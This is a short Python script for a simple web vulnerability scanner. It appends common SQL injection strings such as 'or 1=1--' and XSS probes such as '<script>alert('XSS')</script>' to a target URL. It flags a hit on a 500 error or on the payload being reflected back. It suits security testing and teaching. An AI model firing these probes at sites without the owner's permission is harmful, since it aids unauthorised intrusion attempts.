import requests

def scan_for_sql_injection(url):
    payloads = [
        "'",
        "';",
        "or 1=1--",
        "or 1=1#",
        "\" or 1=1--",
        "\" or 1=1#",
        "or 1=1/*",
        ") or 1=1--",
        ") or 1=1#",
        "\" or 1=1/*"
    ]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if response.status_code == 500:
            print("[+] SQL Injection vulnerability detected in: " + test_url)
            return True
    return False

def scan_for_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS') />",
        "\";alert('XSS');//"
    ]
    
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if payload in response.text:
            print("[+] XSS vulnerability detected in: " + test_url)
            return True
    return False

if __name__ == '__main__':
    target_url = input("Enter the target URL: ")
    scan_type = input("Enter '1' to scan for SQL Injection vulnerabilities or '2' to scan for XSS vulnerabilities: ")

    if scan_type == "1":
        sql_injection_vuln = scan_for_sql_injection(target_url)
        if sql_injection_vuln:
            print("SQL Injection vulnerabilities detected.")
        else:
            print("No SQL Injection vulnerabilities detected.")
    elif scan_type == "2":
        xss_vuln = scan_for_xss(target_url)
        if xss_vuln:
            print("XSS vulnerabilities detected.")
        else:
            print("No XSS vulnerabilities detected.")
    else:
        print("Invalid input. Please enter '1' or '2'.")
